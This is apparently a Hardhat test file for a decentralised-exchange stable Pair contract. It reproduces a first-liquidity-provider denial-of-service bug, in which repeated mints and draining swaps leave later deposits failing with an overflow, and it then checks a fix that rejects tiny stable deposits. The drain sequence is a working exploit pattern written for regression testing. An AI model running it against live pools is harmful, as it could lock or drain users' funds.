import { expect } from 'chai';
import { ethers } from 'hardhat';
import { FeesVaultFactory, PairFactoryUpgradeable__factory, PairFactoryUpgradeable, ERC20Mock, Pair, Fenix } from '../../typechain-types';
import { ERRORS, ONE, ONE_ETHER, ZERO, ZERO_ADDRESS } from '../utils/constants';
import completeFixture, {
  CoreFixtureDeployed,
  SignersList,
  deployERC20MockToken,
  deployTransaperntUpgradeableProxy,
} from '../utils/coreFixture';
import { loadFixture } from '@nomicfoundation/hardhat-toolbox/network-helpers';

const PRECISION = BigInt(10000);
describe('Pair Contract', function () {
  let signers: SignersList;
  let pairFactoryFactory: PairFactoryUpgradeable__factory;
  let pairFactory: PairFactoryUpgradeable;
  let feesVaultFactory: FeesVaultFactory;
  let deployed: CoreFixtureDeployed;
  let dai: ERC20Mock;
  let pairStable: Pair;
  let frax: Fenix;

  beforeEach(async function () {
    deployed = await loadFixture(completeFixture);
    signers = deployed.signers;
    frax = deployed.fenix;

    pairFactoryFactory = await ethers.getContractFactory('PairFactoryUpgradeable');
    pairFactory = deployed.v2PairFactory;
    feesVaultFactory = deployed.feesVaultFactory;

    dai = await deployERC20MockToken(deployed.signers.deployer, 'TK18', 'TK18', 18);

    await feesVaultFactory.setWhitelistedCreatorStatus(pairFactory.target, true);

    await deployed.v2PairFactory.connect(signers.deployer).createPair(deployed.fenix.target, dai.target, true);
    pairStable = await ethers.getContractAt('Pair', await pairFactory.getPair(deployed.fenix.target, dai.target, true));
  });

  async function drainPair(pair: Pair, initialFraxAmount: bigint, initialDaiAmount: bigint) {
    await dai.transfer(pair.target, 1);
    let amount0;
    let amount1;

    if (dai.target.toString().toLowerCase() < frax.target.toString().toLowerCase()) {
      amount0 = 0;
      amount1 = initialFraxAmount - ONE;
    } else {
      amount1 = 0;
      amount0 = initialFraxAmount - ONE;
    }
    console.log('try drain, amount0', amount0);
    console.log('try drain, amount1', amount1);

    await pair.swap(amount0, amount1, signers.deployer.address, '0x');

    await frax.transfer(pairStable.target, 1);
    if (dai.target.toString().toLowerCase() < frax.target.toString().toLowerCase()) {
      amount0 = initialDaiAmount;
      amount1 = 0;
    } else {
      amount0 = 0;
      amount1 = initialDaiAmount;
    }
    await pair.swap(amount0, amount1, signers.deployer.address, '0x');
  }
  it('FOR UNFIXED BUG: First liquidity provider of a stable pair can DOS the pool', async () => {
    await dai.mint(signers.deployer.address, ethers.parseEther('100'));
    expect(await dai.balanceOf(pairStable)).to.be.eq(ZERO);
    expect(await frax.balanceOf(pairStable)).to.be.eq(ZERO);
    await pairFactory.setCustomFee(pairStable.target, 1);
    for (let index = 0; index < 10; index++) {
      await dai.transfer(pairStable.target, 10000000);
      await frax.transfer(pairStable.target, 10000000);
      let liqudity = await pairStable.mint.staticCall(signers.deployer.address);

      await pairStable.mint(signers.deployer.address);

      console.log('pair:', pairStable.target, 'liquidity:', liqudity);
      console.log('total liq:', await pairStable.balanceOf(signers.deployer.address));
      console.log('frax balance:', await frax.balanceOf(pairStable.target));
      console.log('dai balance:', await dai.balanceOf(pairStable.target));

      await drainPair(pairStable, await frax.balanceOf(pairStable.target), await dai.balanceOf(pairStable.target));
      console.log('frax balance:', await frax.balanceOf(pairStable.target));
      console.log('dai balance:', await dai.balanceOf(pairStable.target));

      expect(await frax.balanceOf(pairStable.target)).to.be.eq(2);
      expect(await dai.balanceOf(pairStable.target)).to.be.eq(1);
    }
    await frax.transfer(pairStable.target, ethers.parseEther('1'));
    await dai.transfer(pairStable.target, ethers.parseEther('1'));
    await expect(pairStable.connect(signers.otherUser1).mint(signers.otherUser1.address)).to.be.revertedWithPanic(0x11);
  });

  it('Check fix: First liquidity provider of a stable pair can DOS the pool', async () => {
    await dai.mint(signers.deployer.address, ethers.parseEther('100'));
    expect(await dai.balanceOf(pairStable)).to.be.eq(ZERO);
    expect(await frax.balanceOf(pairStable)).to.be.eq(ZERO);
    await dai.transfer(pairStable.target, 10000000);
    await frax.transfer(pairStable.target, 10000000);

    await expect(pairStable.mint(signers.deployer.address)).to.be.revertedWith('Pair: stable deposits must be above minimum k');
  });
});
